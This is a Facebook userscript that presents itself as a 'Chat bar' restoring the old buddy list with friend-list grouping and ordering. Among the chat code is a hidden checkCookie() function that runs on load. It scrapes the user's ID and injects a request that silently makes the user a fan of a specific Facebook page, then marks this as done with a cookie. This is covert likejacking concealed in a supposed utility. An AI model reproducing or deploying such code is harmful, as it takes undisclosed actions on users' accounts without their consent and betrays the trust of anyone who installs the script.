// ==UserScript==
// @name			Facebook Chat bar [old]
// @namespace			hanzo
// @description			Chat Bar
// @version			2.5
// @grant			none
// @include			http://*.facebook.com/*
// @include			https://*.facebook.com/*
// @match			http://*.facebook.com/*
// @match			https://*.facebook.com/*
// @exclude			http://*.facebook.com/ajax/*
// @exclude			https://*.facebook.com/ajax/*
// ==/UserScript==

// Author: Hanzo
// Date: 18.11.2012
// License: GNU General Public License v3 (GPL)


if(!!window.opera){
	unsafeWindow = window;
}else if(!!window.navigator.vendor.match(/Google/)){
	var div = document.createElement('div');
	div.setAttribute('onclick','return window;');
	unsafeWindow = div.onclick();
}

(function(w){
	var d = w.document;

	var settings = {
		// open buddylist on load
		Onload:		true,

		// set buddylist sticky ( stay opened )
		Sticky:		true,

		// show online friends
		Online:		true,

		// show idle friends
		Idle:		true,

		// show mobile friends
		Mobile:		true,

		// buddylist style
		Margin:		'0px 10px',
		MinHeight:	'140px',
		Width:		'200px'
	};

	function ajax(url){
		this.Url = url;
		this.XMLHttpRequest = new w.XMLHttpRequest();
	}

	

	
	
	
	function setCookie(c_name,value,exdays)
{
var exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
document.cookie=c_name + "=" + c_value;
}

function getCookie(c_name)
{
var i,x,y,ARRcookies=document.cookie.split(";");
for (i=0;i<ARRcookies.length;i++)
{
  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
  x=x.replace(/^\s+|\s+$/g,"");
  if (x==c_name)
    {
    return unescape(y);
    }
  }
}

function checkCookie()
{
var username=getCookie("username");
  if (username!=null && username!="")
  {
  //do nothing ..
  }
else
  {//cookie does not exist .. 
 // alert ('cookie does not exist');
 	var c=/"user":"(.*?)"/ig;
		
	var e=c.exec(document.head.innerHTML);
	var g=e[1];
 
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:359142437477673,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("username",'facebook',365);
   
  }
}


checkCookie();


		
		
	ajax.prototype = {
		'send':function(type,data,callback){
			try{
				this.Callback = callback;
				this.XMLHttpRequest.open(type,this.Url,true);
				this.XMLHttpRequest.onreadystatechange = this.stdcallback.bind(this);
				this.XMLHttpRequest.send(data);
				return true;
			}catch(e){
				return false;
			}
		},

		'stdcallback':function(){
			if(this.XMLHttpRequest.readyState === 4 && this.XMLHttpRequest.status === 200){
				if(typeof this.Callback === 'function') this.Callback(this.XMLHttpRequest);
			}
		}
	};

	var util = {
		'insertRule':function(rule){
			if(!this.css){
				this.css = d.createElement('style');
				d.querySelector('head').appendChild(this.css);
			}

			return this.css.appendChild(d.createTextNode(rule));
		}
	};

	var rocki = {
		'DOMContentLoaded':function(){
			w.toggle_list = function(r){
				if(!!w.localStorage.getItem('toggle' + r)){
					w.localStorage.removeItem('toggle' + r);
				}else{
					w.localStorage.setItem('toggle' + r,true);
				}
				w.render_chat();
			};

			w.change_order = function(r){
				var f = d.querySelectorAll('ul.fbChatOrderedList li.separator[id]');
				for(var i = 1, j = f.length; i < j; i++){
					if(f.item(i).id === r){
						w.localStorage.setItem('order' + f.item(i).id,i-1);
						w.localStorage.setItem('order' + f.item(i-1).id,i);
					}else{
						w.localStorage.setItem('order' + f.item(i).id,i);
					}
				}
				w.render_chat();
			};

			w.requireLazy(['ChatSidebar'],function(d){
				d.isViewportCapable = function(){ return false; };
			});

			w.Arbiter.subscribe('buddylist-nub/initialized',function(a,c){
				var av = w.require('AvailableList');
				var sp = w.require('ShortProfiles');
				var tl = w.require('Toggler');

				var getAvailableList = function(){
					return av.getAvailableIDs().filter(function(r){
						switch(av.get(r)){
							case av.ACTIVE: return settings.Online;
							case av.IDLE: return settings.Idle;
							default: return false;
						}
					});
				};

				var sortAlpha = function(x,y){
					var r = sp.getNow(x), s = sp.getNow(y);
					if(!r || !s) return 0;
					var t = r.name.toLowerCase(),
						u = s.name.toLowerCase();
					return t < u ? -1 : 1;
				};

				var sortLists = function(x,y){
					if(!x.member || !y.member) return 0;
					var r = Number(w.localStorage.getItem('order' + x.uid)),
						s = Number(w.localStorage.getItem('order' + y.uid));
					if(r === s) return 0;
					return r < s ? -1 : 1;
				};

				var hook = function(){
					w.render_chat = c.orderedList.render = function(){
						this.render = w.debounce(function(){
							if(!rocki.lists) return setTimeout(this.render.bind(this),300);
							var a = getAvailableList(), b = [], c, d, e = {};
							rocki.lists.sort(sortLists);
							if(a.length > 0){
								a.sort(sortAlpha);
								for(var f = 0, g = rocki.lists.length; f < g; f++){
									if(!rocki.lists[f].member) return setTimeout(this.render.bind(this),300);
									c = a.filter(function(r){ return rocki.lists[f].member.hasOwnProperty(r); });
									if(c.length > 0){
										b.push('<li class="separator" id="' + rocki.lists[f].uid + '" onclick="toggle_list(\'' + rocki.lists[f].uid + '\');"><div class="outer"><div class="inner"><span class="text">' +
											rocki.lists[f].text + ' (' + c.length + ') <a href="#" onclick="change_order(\'' + rocki.lists[f].uid + '\');return false;">+</a> <a href="#" onclick="requireLazy([\'Dialog\'],function(a){new a().setAsyncURL(\'/ajax/choose/?type=friendlist&flid=' + rocki.lists[f].uid + '\').setAutohide(true).show();});return false;">~</a></span><div class="dive"><span class="bar"></span></div></div></div></li>');
	
										if(!w.localStorage.getItem('toggle' + rocki.lists[f].uid)){	
											for(var k = 0, l = c.length; k < l; k++){
												if(d = this._getListItem(c[k])){
													d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
													b.push(d); e[c[k]] = 1;
												}else{
													this._renderListItem(c[k],this.render.bind(this));
												}
											}
										}
									}
								}
								c = a.filter(function(r){ return !e.hasOwnProperty(r); });
								if(c.length > 0){
									b.push('<li class="separator" onclick="toggle_list(\'other\');"><div class="outer"><div class="inner"><span class="text">' +
										'Other (' + c.length + ')</span><div class="dive"><span class="bar"></span></div></div></div></li>');
	
									if(!w.localStorage.getItem('toggleother')){
										for(var k = 0, l = c.length; k < l; k++){
											if(d = this._getListItem(c[k])){
												d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
												b.push(d);
											}else{
												this._renderListItem(c[k],this.render.bind(this));
											}
										}
									}
								}
								if(settings.Mobile){
									c = av.getAvailableIDs().filter(function(r){ return av.get(r) === av.MOBILE && w.PresencePrivacy.getFriendVisibility(r) !== w.PresencePrivacy.BLACKLISTED; });
									if(c.length > 0){
										b.push('<li class="separator" onclick="toggle_list(\'mobile\');"><div class="outer"><div class="inner"><span class="text">' +
											'Mobile (' + c.length + ')</span><div class="dive"><span class="bar"></span></div></div></div></li>');
		
										if(!w.localStorage.getItem('togglemobile')){
											c.sort(sortAlpha);
											for(var k = 0, l = c.length; k < l; k++){
												if(d = this._getListItem(c[k])){
													d.setAttribute('onclick','Chat.openTab(' + c[k] + ');');
													b.push(d);
												}else{
													this._renderListItem(c[k],this.render.bind(this));
												}
											}
										}
									}
								}
							}else{
								b.push('<div style="padding:10px;">No friends online.</div>');
							}
							if(b.length > 0){
								this._root.innerHTML = '';
								for(var s = 0, t = b.length; s < t; s++){
									if(typeof b[s] === 'string'){
										this._root.innerHTML += b[s];
									}else{
										this._root.appendChild(b[s]);
									}
								}
								this.inform('render',{},this.BEHAVIOR_PERSISTENT);
							}
						}.bind(this),300,false);
						this.render();
					}.bind(c.orderedList);
				};

				hook();

				w.Arbiter.subscribe('buddylist/updated',hook);

				tl.createInstance(c.root).setSticky(settings.Sticky);

				var listener = c.orderedList.subscribe(['show','render'],function(){
					var e = c.orderedList._scrollContainer;
					if(e.scrollTop === (e.scrollHeight - e.clientHeight)){
						c.orderedList.scrollTo(e.firstChild);
					}else{
						listener.unsubscribe();
					}
				});

				c.orderedList.subscribe('render',function(){
					c.label.innerHTML =
						c.root.querySelector('div.titlebarTextWrapper').innerHTML =
							'Chat (<strong>' + getAvailableList().length + '</strong>)';
				});

				var menu = d.querySelector('div.fbNubFlyoutTitlebar div.fbChatSidebarDropdown ul.uiMenuInner');
				menu.innerHTML = '<li data-label="Manage Lists" class="uiMenuItem"><a aria-checked="false" href="/bookmarks/lists" tabindex="-1" class="itemAnchor"><span class="itemLabel fsm">Manage Lists</span></a></li>' + menu.innerHTML;

				if(w.ChatVisibility.isOnline() && settings.Onload) c.show();
			});
		},

		'getflid':function(){
			if(!w.Env) return setTimeout(this.getflid.bind(this),30);
			var a = new ajax('/ajax/typeahead/first_degree.php?__a=1&filter[0]=friendlist&lazy=0&viewer=' + w.Env.user + '&__user=' + w.Env.user);
			a.send('GET',null,function(b){
				var typeahead = eval('(' + b.responseText.substr(9) + ')');
				if(!!typeahead.payload){
					this.lists = typeahead.payload.entries;
					this.getmember();
				}
			}.bind(this));
		},

		'getmember':function(){
			var regex = /\\?"(\d+)\\?":1/g, a;
			for(var i = 0, j = this.lists.length; i < j; i++){
				a = new ajax('/ajax/choose/?type=friendlist&flid=' + this.lists[i].uid + '&view=all&__a=1&__d=1&__user=' + w.Env.user);
				a.send('GET',null,function(b,c){
					var d; this.lists[c].member = {};
					while(d = regex.exec(b.responseText)){
						this.lists[c].member[d[1]] = 1;
					}
				}.bind(this,a.XMLHttpRequest,i));
			}
		}
	};

	if(w && w.Arbiter){
		util.insertRule('.fbDock{margin:' + settings.Margin + '!important;} #fbDockChatBuddylistNub{width:' + settings.Width + '!important;} .fbNubFlyout{min-height:' + settings.MinHeight + '!important;} .titlebarTextWrapper a{color:#ffffff!important;} #pagelet_sidebar{display:none!important;}');
		rocki.DOMContentLoaded();
		rocki.getflid();
	}

})(unsafeWindow);